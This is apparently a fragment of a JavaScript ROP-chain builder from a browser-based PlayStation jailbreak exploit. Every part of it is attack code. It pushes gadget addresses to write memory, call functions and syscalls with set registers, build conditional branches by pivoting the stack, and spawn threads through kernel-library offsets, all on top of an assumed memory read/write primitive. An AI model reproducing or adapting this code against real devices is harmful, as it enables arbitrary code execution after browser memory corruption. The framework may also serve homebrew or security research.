    this.finalizeSymbolic(this.pushSymbolic(), val);
  }

  this.push_write8 = function (where, what) {
    this.push(gadgets["pop rdi"]);
    this.push(where);
    this.push(gadgets["pop rsi"]);
    this.push(what);
    this.push(gadgets["mov [rdi], rsi"]);
  }
  
  this.push_write4 = function (where, what) {
    this.push(gadgets["pop rdi"]);
    this.push(where);
    this.push(gadgets["pop rax"]);
    this.push(what);
    this.push(gadgets["mov [rdi], rax"]);
  }

  this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
    if (rdi != undefined) {
      this.push(gadgets["pop rdi"]);
      this.push(rdi);
    }

    if (rsi != undefined) {
      this.push(gadgets["pop rsi"]);
      this.push(rsi);
    }

    if (rdx != undefined) {
      this.push(gadgets["pop rdx"]);
      this.push(rdx);
    }

    if (rcx != undefined) {
      this.push(gadgets["pop rcx"]);
      this.push(rcx);
    }

    if (r8 != undefined) {
      this.push(gadgets["pop r8"]);
      this.push(r8);
    }

    if (r9 != undefined) {
      this.push(gadgets["pop r9"]);
      this.push(r9);
    }

    this.push(rip);
    return this;
  }

  this.call = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
    this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
    this.write_result(this.retval);
    this.run();
    return p.read8(this.retval);
  }

  this.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9) {
    return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
  }

  //get rsp of the next push
  this.get_rsp = function () {
    return this.stack.add32(this.count * 8);
  }
  this.write_result = function (where) {
    this.push(gadgets["pop rdi"]);
    this.push(where);
    this.push(gadgets["mov [rdi], rax"]);
  }
  this.write_result4 = function (where) {
    this.push(gadgets["pop rdi"]);
    this.push(where);
    this.push(gadgets["mov [rdi], eax"]);
  }
  
  //use this in loops.
  this.syscall_safe = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
    if (rdi != undefined) {
      this.push(gadgets["pop rdi"]);
      this.push(rdi);
    }

    if (rsi != undefined) {
      this.push(gadgets["pop rsi"]);
      this.push(rsi);
    }

    if (rdx != undefined) {
      this.push(gadgets["pop rdx"]);
      this.push(rdx);
    }

    if (rcx != undefined) {
      this.push(gadgets["pop rcx"]);
      this.push(rcx);
    }

    if (r8 != undefined) {
      this.push(gadgets["pop r8"]);
      this.push(r8);
    }

    if (r9 != undefined) {
      this.push(gadgets["pop r9"]);
      this.push(r9);
    }
    var sysc_restore = this.get_rsp();
    this.push(window.syscalls[sysc]);
    this.push_write8(sysc_restore, window.syscalls[sysc]);
  }
  this.jmp_rsp = function (rsp) {
    this.push(window.gadgets["pop rsp"]);
    this.push(rsp);
  }
  
  this.create_equal_branch = function (value_addr, compare_value) {
    var branch_addr_spc = this.branches_rsps.add32(this.branches_count * 0x10);
    this.branches_count++;

    this.push(window.gadgets["pop rax"]);
    this.push(0);
    this.push(window.gadgets["pop rcx"]);
    this.push(value_addr);
    this.push(window.gadgets["pop rdi"]);
    this.push(compare_value);
    this.push(window.gadgets["cmp [rcx], edi"]);
    this.push(window.gadgets["setne al"]);
    this.push(window.gadgets["shl rax, 3"]);
    this.push(window.gadgets["pop rdx"]);
    this.push(branch_addr_spc);
    this.push(window.gadgets["add rax, rdx"]);
    this.push(window.gadgets["mov rax, [rax]"]);
    this.push(window.gadgets["pop rdi"]);
    var a  = this.pushSymbolic();
    this.push(window.gadgets["mov [rdi], rax"]);
    this.push(window.gadgets["pop rsp"]);
    var b = this.get_rsp();
    this.push(0x41414141);

    this.finalizeSymbolic(a, b);

    return branch_addr_spc;

  }
  this.create_greater_branch = function (value_addr, compare_value) {
    var branch_addr_spc = this.branches_rsps.add32(this.branches_count * 0x10);
    this.branches_count++;

    this.push(window.gadgets["pop rax"]);
    this.push(0);
    this.push(window.gadgets["pop rcx"]);
    this.push(value_addr);
    this.push(window.gadgets["pop rdi"]);
    this.push(compare_value);
    this.push(window.gadgets["cmp [rcx], edi"]);
    this.push(window.gadgets["setle al"]);
    this.push(window.gadgets["shl rax, 3"]);
    this.push(window.gadgets["pop rdx"]);
    this.push(branch_addr_spc);
    this.push(window.gadgets["add rax, rdx"]);
    this.push(window.gadgets["mov rax, [rax]"]);
    this.push(window.gadgets["pop rdi"]);
    var a  = this.pushSymbolic();
    this.push(window.gadgets["mov [rdi], rax"]);
    this.push(window.gadgets["pop rsp"]);
    var b = this.get_rsp();
    this.push(0x41414141);

    this.finalizeSymbolic(a, b);

    return branch_addr_spc;
  }
  this.create_greater_or_equal_branch = function (value_addr, compare_value) {
    var branch_addr_spc = this.branches_rsps.add32(this.branches_count * 0x10);
    this.branches_count++;

    this.push(window.gadgets["pop rax"]);
    this.push(0);
    this.push(window.gadgets["pop rcx"]);
    this.push(value_addr);
    this.push(window.gadgets["pop rdi"]);
    this.push(compare_value);
    this.push(window.gadgets["cmp [rcx], edi"]);
    this.push(window.gadgets["setl al"]);
    this.push(window.gadgets["shl rax, 3"]);
    this.push(window.gadgets["pop rdx"]);
    this.push(branch_addr_spc);
    this.push(window.gadgets["add rax, rdx"]);
    this.push(window.gadgets["mov rax, [rax]"]);
    this.push(window.gadgets["pop rdi"]);
    var a  = this.pushSymbolic();
    this.push(window.gadgets["mov [rdi], rax"]);
    this.push(window.gadgets["pop rsp"]);
    var b = this.get_rsp();
    this.push(0x41414141);

    this.finalizeSymbolic(a, b);

    return branch_addr_spc;
  }
  this.create_lesser_branch = function (value_addr, compare_value) {
    var branch_addr_spc = this.branches_rsps.add32(this.branches_count * 0x10);
    this.branches_count++;

    this.push(window.gadgets["pop rax"]);
    this.push(0);
    this.push(window.gadgets["pop rcx"]);
    this.push(value_addr);
    this.push(window.gadgets["pop rdi"]);
    this.push(compare_value);
    this.push(window.gadgets["cmp [rcx], edi"]);
    this.push(window.gadgets["setge al"]);
    this.push(window.gadgets["shl rax, 3"]);
    this.push(window.gadgets["pop rdx"]);
    this.push(branch_addr_spc);
    this.push(window.gadgets["add rax, rdx"]);
    this.push(window.gadgets["mov rax, [rax]"]);
    this.push(window.gadgets["pop rdi"]);
    var a  = this.pushSymbolic();
    this.push(window.gadgets["mov [rdi], rax"]);
    this.push(window.gadgets["pop rsp"]);
    var b = this.get_rsp();
    this.push(0x41414141);

    this.finalizeSymbolic(a, b);

    return branch_addr_spc;
  }
  this.create_lesser_or_equal_branch = function (value_addr, compare_value) {
    var branch_addr_spc = this.branches_rsps.add32(this.branches_count * 0x10);
    this.branches_count++;

    this.push(window.gadgets["pop rax"]);
    this.push(0);
    this.push(window.gadgets["pop rcx"]);
    this.push(value_addr);
    this.push(window.gadgets["pop rdi"]);
    this.push(compare_value);
    this.push(window.gadgets["cmp [rcx], edi"]);
    this.push(window.gadgets["setg al"]);
    this.push(window.gadgets["shl rax, 3"]);
    this.push(window.gadgets["pop rdx"]);
    this.push(branch_addr_spc);
    this.push(window.gadgets["add rax, rdx"]);
    this.push(window.gadgets["mov rax, [rax]"]);
    this.push(window.gadgets["pop rdi"]);
    var a  = this.pushSymbolic();
    this.push(window.gadgets["mov [rdi], rax"]);
    this.push(window.gadgets["pop rsp"]);
    var b = this.get_rsp();
    this.push(0x41414141);

    this.finalizeSymbolic(a, b);

    return branch_addr_spc;
  }
  this.set_branch_points = function (branch_addr_sp, rsp_condition_met, rsp_condition_not_met) {
    p.write8(branch_addr_sp.add32(0x0), rsp_condition_met);
    p.write8(branch_addr_sp.add32(0x8), rsp_condition_not_met);
  }
  this.spawn_thread = function(name, chain_setup) {
    var new_thr = new rop();
    var context = p.malloc(0x100);

    p.write8(context.add32(0x0), window.gadgets["ret"]);
    p.write8(context.add32(0x10), new_thr.stack);
    new_thr.push(window.gadgets["ret"]);
    chain_setup(new_thr);

    var retv = function () {
      chain.call(libKernelBase.add32(OFFSET_lk_pthread_create_name_np), context.add32(0x48), 0, libSceLibcInternalBase.add32(OFFSET_libcint_longjmp), context, p.stringify(name));
    }
    window.nogc.push(new_thr);
    window.nogc.push(context);

    return retv;
  }

  this.run = function () {
    p.launch_chain(this);
    this.clear();
  }

  return this;
};